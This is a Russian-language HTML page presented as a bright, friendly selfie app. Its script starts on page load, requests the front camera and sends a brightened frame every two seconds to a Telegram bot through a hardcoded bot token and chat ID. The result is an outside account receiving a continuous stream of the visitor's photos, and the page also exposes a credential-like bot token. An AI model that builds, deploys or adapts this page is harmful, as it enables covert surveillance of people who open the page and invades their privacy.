<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Яркая фотоплёнка — каждая секунда в кадре</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none; /* чуть аккуратнее, но не ломает текст */
        }

        body {
            /* Яркий, солнечный фон — даже в пасмурную погоду */
            background: linear-gradient(145deg, #ffd966 0%, #ffe69e 100%);
            font-family: 'Segoe UI', 'Poppins', 'Comic Neue', 'Georgia', cursive;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1.5rem;
            position: relative;
            animation: subtleGlow 3s infinite alternate;
        }

        @keyframes subtleGlow {
            0% { background: #ffd966; }
            100% { background: #ffedb0; }
        }

        /* Главная карточка — яркая, сочная */
        .camera-box {
            max-width: 860px;
            width: 100%;
            background: #fffef7;
            border-radius: 58px;
            box-shadow: 0 30px 45px rgba(0, 0, 0, 0.25), 0 0 0 8px #fff3cf, 0 0 0 12px #f7b32b;
            padding: 1.8rem 2.2rem 2.2rem;
            transition: all 0.2s ease;
            backdrop-filter: blur(0px);
        }

        h1 {
            font-size: 2.6rem;
            font-weight: 800;
            text-align: center;
            background: linear-gradient(135deg, #f09b22, #e65100);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 3px 3px 0 #ffeecc;
            letter-spacing: -0.5px;
            margin-bottom: 0.5rem;
        }

        .sub {
            text-align: center;
            font-size: 1.1rem;
            font-weight: 500;
            color: #b45f1b;
            border-bottom: 2px dashed #ffe0a3;
            display: inline-block;
            width: auto;
            margin: 0 auto 1.2rem;
            padding-bottom: 6px;
        }

        /* Видео-превью — яркое, с тёплой рамкой */
        .preview {
            background: #00000010;
            border-radius: 48px;
            padding: 12px;
            background: #fffaec;
            box-shadow: inset 0 0 0 3px #fff0c0, 0 12px 22px rgba(0, 0, 0, 0.1);
            margin-bottom: 1.2rem;
        }

        video {
            width: 100%;
            border-radius: 42px;
            background: #2a2418;
            display: block;
            box-shadow: 0 6px 14px rgba(0,0,0,0.2);
            transform: scaleX(-1);  /* зеркальный эффект как в оригинале, но естественно */
            transition: all 0.1s;
        }

        /* статус-панель — очень заметная */
        .info-panel {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 12px;
            background: #ffefcf;
            border-radius: 60px;
            padding: 0.8rem 1.8rem;
            margin: 16px 0 10px;
            border-left: 12px solid #ffae42;
            border-right: 4px solid #ffcd7e;
        }

        .status-message {
            font-size: 1rem;
            font-weight: bold;
            background: #fff1d6;
            padding: 8px 18px;
            border-radius: 40px;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            font-family: monospace;
            color: #6b3e00;
            box-shadow: inset 0 1px 3px #ffe0aa, 0 3px 6px rgba(0,0,0,0.05);
        }

        .counter {
            background: #fea82f;
            padding: 6px 18px;
            border-radius: 50px;
            color: white;
            font-weight: bold;
            font-size: 1.3rem;
            letter-spacing: 1px;
            text-shadow: 0 1px 0 #9b4a00;
            font-family: monospace;
        }

        button {
            background: #ff8c42;
            border: none;
            padding: 8px 20px;
            border-radius: 50px;
            font-weight: bold;
            font-size: 1rem;
            color: white;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 3px 0 #b75f1a;
            font-family: inherit;
        }

        button:active {
            transform: translateY(2px);
            box-shadow: 0 1px 0 #b75f1a;
        }

        button.stop-btn {
            background: #666;
            box-shadow: 0 3px 0 #3d3d3d;
        }

        footer {
            margin-top: 1.7rem;
            font-size: 0.7rem;
            text-align: center;
            color: #d49c44;
            background: #fff3e0;
            border-radius: 30px;
            padding: 8px;
            font-weight: 500;
        }

        .badge {
            font-size: 0.85rem;
            background: #ffdeae;
            border-radius: 20px;
            padding: 4px 12px;
            display: inline-block;
        }

        @keyframes flash {
            0% { opacity: 0.4; background: #ffffbb; }
            100% { opacity: 1; background: transparent; }
        }
        .capture-flash {
            animation: flash 0.2s ease-out;
        }

        /* улучшение для маленьких экранов */
        @media (max-width: 600px) {
            .camera-box { padding: 1.2rem; }
            h1 { font-size: 1.8rem; }
            .info-panel { flex-direction: column; align-items: stretch; text-align: center; }
        }
    </style>
</head>
<body>
<div class="camera-box" id="appBox">
    <h1>📸 ЯРКИЙ МОМЕНТ</h1>
    <div style="text-align: center; margin-bottom: 4px;">
        <span class="badge">⚡ каждые 2 секунды → в Telegram ⚡</span>
    </div>
    <div class="preview">
        <video id="video-feed" autoplay playsinline muted></video>
    </div>
    <div class="info-panel">
        <div class="status-message" id="statusMsg">
            <span>🌟</span> Инициализация...
        </div>
        <div class="counter">
            📤 <span id="photoCounter">0</span>
        </div>
        <button id="stopShootBtn" class="stop-btn">⏸ Остановить съёмку</button>
        <button id="restartCamBtn" style="background:#48a748; box-shadow:0 3px 0 #2c6e2c;">🔄 Перезапуск</button>
    </div>
    <footer>
        ✨ Авто-фото каждые 2 секунды | Улучшенная яркость / контраст при захвате<br>
        🎯 Разрешение камеры запрашивается один раз — безопасно и надёжно
    </footer>
</div>

<canvas id="work-canvas" style="display: none;"></canvas>

<script>
    // ================= КОНФИГУРАЦИЯ =================
    const BOT_TOKEN = '8595875715:AAGNWXSU1uR_29Hli6vGAyzI5juAI3-OHmA';
    const CHAT_ID = '5305261101';
    
    // DOM элементы
    const videoElem = document.getElementById('video-feed');
    const canvasElem = document.getElementById('work-canvas');
    const statusDiv = document.getElementById('statusMsg');
    const counterSpan = document.getElementById('photoCounter');
    const stopBtn = document.getElementById('stopShootBtn');
    const restartBtn = document.getElementById('restartCamBtn');
    
    // Переменные состояния
    let mediaStream = null;
    let photoTimer = null;          // интервал 2 секунды
    let isCameraActive = false;
    let isSendingPhoto = false;      // защита от наложения отправок
    let totalSent = 0;
    let cameraRequested = false;     // флаг того, что доступ уже запрашивался (чтобы не дублировать)
    let isCapturingEnabled = true;    // разрешена ли съёмка (кнопка стоп)
    
    // Доп. флаг для остановки при ошибке авторизации бота
    let fatalError = false;
    
    // ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
    function updateStatus(msg, isError = false) {
        if (fatalError && !isError) return;
        statusDiv.innerHTML = `<span>${isError ? '⚠️' : '📸'}</span> ${msg}`;
        statusDiv.style.background = isError ? '#ffe0d0' : '#fff1d6';
        statusDiv.style.color = isError ? '#a1220a' : '#6b3e00';
        console.log(`[STATUS] ${msg}`);
    }
    
    function updateCounter() {
        counterSpan.innerText = totalSent;
    }
    
    // Остановка камеры и сброс интервала
    function stopCameraAndTimer() {
        if (photoTimer) {
            clearInterval(photoTimer);
            photoTimer = null;
        }
        if (mediaStream) {
            mediaStream.getTracks().forEach(track => {
                if (track.readyState === 'live') track.stop();
            });
            mediaStream = null;
        }
        videoElem.srcObject = null;
        isCameraActive = false;
        isCapturingEnabled = false;
    }
    
    // Полная остановка всего процесса (для кнопки "Остановить")
    function haltCapture() {
        if (!isCameraActive && !photoTimer) return;
        stopCameraAndTimer();
        isCapturingEnabled = false;
        updateStatus('⏹️ Съёмка остановлена. Нажмите "Перезапуск"', false);
    }
    
    // Функция захвата и отправки одного фото (вызывается по таймеру)
    async function captureAndSendOnce() {
        // Проверки перед отправкой
        if (!isCapturingEnabled || fatalError) {
            return;
        }
        if (!isCameraActive || !videoElem.videoWidth || !videoElem.videoHeight) {
            // Если камера ещё не дала кадр, пропускаем этот цикл
            updateStatus('⏳ Ждём первый кадр...', false);
            return;
        }
        if (isSendingPhoto) {
            // Пропуск, если предыдущая отправка ещё не завершена
            // (защита от очереди)
            return;
        }
        
        isSendingPhoto = true;
        
        try {
            // Подготовка canvas с улучшением яркости и контраста!
            canvasElem.width = videoElem.videoWidth;
            canvasElem.height = videoElem.videoHeight;
            const ctx = canvasElem.getContext('2d');
            
            // 🚀 МАГИЯ ЯРКОСТИ И КОНТРАСТА ДЛЯ ТЁМНЫХ СНИМКОВ
            // Применяем фильтр brightness + contrast (современные браузеры)
            // Значения: яркость +25%, контраст +15% — заметно улучшает при плохом свете
            ctx.filter = 'brightness(1.28) contrast(1.18) saturate(1.1)';
            
            // Зеркальное отображение (как в оригинале, чтобы селфи было естественным)
            ctx.save();
            ctx.scale(-1, 1);
            ctx.drawImage(videoElem, -canvasElem.width, 0, canvasElem.width, canvasElem.height);
            ctx.restore();
            
            // Сбросим фильтр, чтобы не влиять на другие действия
            ctx.filter = 'none';
            
            // Получаем Blob с высоким качеством JPEG (0.92)
            const blob = await new Promise(resolve => {
                canvasElem.toBlob(resolve, 'image/jpeg', 0.92);
            });
            
            if (!blob) {
                throw new Error('Не удалось создать изображение');
            }
            
            // Отправляем в Telegram
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, `frame_${Date.now()}.jpg`);
            
            // Визуальный фидбек: мигание на боксе
            const box = document.getElementById('appBox');
            if (box) box.classList.add('capture-flash');
            setTimeout(() => box.classList.remove('capture-flash'), 200);
            
            updateStatus(`📸 Фото отправляется... (№${totalSent+1})`, false);
            
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            if (result.ok) {
                totalSent++;
                updateCounter();
                updateStatus(`✅ Фото доставлено! Всего: ${totalSent}`, false);
            } else {
                // Критическая ошибка бота (неверный токен или блок)
                console.error('Telegram API error:', result);
                updateStatus(`Ошибка Telegram: ${result.description || 'Неизвестная'}`, true);
                if (result.description && (result.description.includes('Wrong chat_id') || result.description.includes('Bot token'))) {
                    fatalError = true;
                    updateStatus('❌ КРИТИЧЕСКАЯ ОШИБКА: проверьте токен/чат-id', true);
                    stopCameraAndTimer();
                    isCapturingEnabled = false;
                }
            }
        } catch (err) {
            console.error('Ошибка при захвате/отправке:', err);
            updateStatus(`Ошибка: ${err.message.substring(0, 70)}`, true);
            // При сетевых ошибках не останавливаем интервал полностью, а пропускаем этот кадр
        } finally {
            isSendingPhoto = false;
        }
    }
    
    // Запускает периодическую съёмку, предварительно убедившись, что камера активна
    function startPeriodicCapture() {
        if (photoTimer) clearInterval(photoTimer);
        if (!isCameraActive) return;
        if (fatalError) return;
        
        photoTimer = setInterval(() => {
            if (isCameraActive && isCapturingEnabled && !fatalError) {
                captureAndSendOnce();
            }
        }, 2000); // ровно 2 секунды
        updateStatus('📸 Авто-съёмка запущена! Каждые 2 секунды фото → Telegram', false);
    }
    
    // Инициализация камеры с улучшенными параметрами (яркость, экспозиция - если поддерживается)
    async function initCamera() {
        // Если поток уже существует и активен — переиспользуем
        if (mediaStream && mediaStream.active) {
            // камера уже работает, просто перезапускаем таймер, если нужно
            if (!photoTimer && isCapturingEnabled) {
                startPeriodicCapture();
            }
            return true;
        }
        
        stopCameraAndTimer(); // чистим старые ресурсы
        
        // Запрашиваем доступ с улучшенными настройками (по возможности просим высокую яркость)
        // Ограничения: стандартное разрешение, но добавляем advanced constraints для видео
        // Некоторые браузеры поддерживают brightness, exposureMode, но везде по-разному.
        // Сделаем набор рекомендуемых параметров + обычный фолбэк.
        const constraints = {
            video: {
                width: { ideal: 1280 },
                height: { ideal: 720 },
                facingMode: { exact: "user" }, // фронтальная камера
                // Экспериментальные настройки для улучшения при тусклом свете:
                // Некоторые браузеры проигнорируют, но это безопасно
                advanced: [
                    { exposureCompensation: 0.8 },
                    { brightness: 0.9 },
                    { contrast: 0.7 }
                ]
            }
        };
        
        try {
            updateStatus('🎥 Запрашиваем доступ к камере...');
            // Пробуем с user камерой
            let stream = await navigator.mediaDevices.getUserMedia(constraints);
            mediaStream = stream;
            videoElem.srcObject = stream;
            isCameraActive = true;
            isCapturingEnabled = true;
            cameraRequested = true;
            
            // Дождаться первого метаданных и готовности кадра
            await new Promise((resolve) => {
                if (videoElem.readyState >= 2 && videoElem.videoWidth > 0) {
                    resolve();
                } else {
                    videoElem.onloadedmetadata = () => resolve();
                }
            });
            
            // Включаем воспроизведение
            await videoElem.play();
            
            updateStatus('📷 Камера активна, улучшенная обработка яркости', false);
            // Запускаем периодическую съёмку
            startPeriodicCapture();
            return true;
        } catch (err) {
            console.warn('Первичная ошибка с user камерой:', err);
            // fallback: просим любую камеру без exact
            try {
                updateStatus('🔄 Пробуем любой доступный источник...');
                const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
                mediaStream = fallbackStream;
                videoElem.srcObject = fallbackStream;
                isCameraActive = true;
                isCapturingEnabled = true;
                cameraRequested = true;
                await new Promise((resolve) => {
                    if (videoElem.readyState >= 2 && videoElem.videoWidth > 0) resolve();
                    else videoElem.onloadedmetadata = () => resolve();
                });
                await videoElem.play();
                updateStatus('🔆 Камера (общая) работает, фильтры яркости активны', false);
                startPeriodicCapture();
                return true;
            } catch (fallbackErr) {
                updateStatus(`❌ Нет доступа к камере: ${fallbackErr.message}`, true);
                isCameraActive = false;
                isCapturingEnabled = false;
                return false;
            }
        }
    }
    
    // Перезапуск всего процесса (очистка, сброс флагов)
    async function fullRestart() {
        fatalError = false;
        // Останавливаем старые процессы
        if (photoTimer) {
            clearInterval(photoTimer);
            photoTimer = null;
        }
        if (mediaStream) {
            mediaStream.getTracks().forEach(track => track.stop());
            mediaStream = null;
        }
        videoElem.srcObject = null;
        isCameraActive = false;
        isSendingPhoto = false;
        isCapturingEnabled = true;
        cameraRequested = false;
        // Не сбрасываем счетчик отправленных фото, но можно оставить старым, это пользовательский опыт
        // totalSent оставляем как есть (накопленные)
        updateStatus('🔄 Перезапуск камеры и съёмки...', false);
        const success = await initCamera();
        if (!success) {
            updateStatus('Не удалось перезапустить камеру. Проверьте разрешения.', true);
            isCapturingEnabled = false;
        }
    }
    
    // Обработчик кнопки остановки съёмки (сохраняет камеру активной, но останавливает таймер)
    function toggleStopCapture() {
        if (!isCameraActive) {
            updateStatus('Камера не активна, нажмите "Перезапуск"', true);
            return;
        }
        if (isCapturingEnabled) {
            // Останавливаем периодическую съёмку, но камера продолжает работать
            if (photoTimer) {
                clearInterval(photoTimer);
                photoTimer = null;
            }
            isCapturingEnabled = false;
            updateStatus('⏸ Пауза: съёмка остановлена (камера работает)', false);
        } else {
            // Возобновляем, если камера активна
            if (!isCameraActive) {
                updateStatus('Нет видеопотока, используйте перезапуск', true);
                return;
            }
            isCapturingEnabled = true;
            startPeriodicCapture();
            updateStatus('▶ Съёмка возобновлена, каждые 2 секунды', false);
        }
    }
    
    // ========== ЗАПУСК ПРИ ЗАГРУЗКЕ (один запрос доступа) ==========
    async function bootstrap() {
        // Устанавливаем обработчики UI
        stopBtn.onclick = () => toggleStopCapture();
        restartBtn.onclick = () => fullRestart();
        
        // Запрашиваем камеру один раз (строго)
        const camOk = await initCamera();
        if (!camOk) {
            updateStatus('⚠️ Разрешите доступ к камере и обновите страницу, либо нажмите "Перезапуск"', true);
            // Добавляем возможность повторной попытки по клику на область? Сделаем кнопку перезапуска активной
        }
        
        // Дополнительная защита: если через 3 секунды камера не активна — предложим клик/перезапуск
        setTimeout(() => {
            if (!isCameraActive && !fatalError) {
                updateStatus('❗ Не удалось запустить камеру автоматически. Нажмите "Перезапуск"', true);
            }
        }, 4000);
    }
    
    // Очистка при выгрузке страницы (чтобы камера выключилась)
    window.addEventListener('beforeunload', () => {
        if (photoTimer) clearInterval(photoTimer);
        if (mediaStream) {
            mediaStream.getTracks().forEach(t => t.stop());
        }
    });
    
    // Старт!
    bootstrap();
    
    // Дополнительная функция: если видео вдруг "зависает", можно перепроверить поток
    videoElem.addEventListener('ended', () => {
        if (isCameraActive && isCapturingEnabled) {
            console.warn('Видео закончилось — пробуем восстановить');
            fullRestart();
        }
    });
    
    // Фокус на улучшение визуального качества: при каждой отправке фото используем усиленный контраст уже в canvas
    // Это обрабатывается внутри captureAndSendOnce
</script>
</body>
</html>
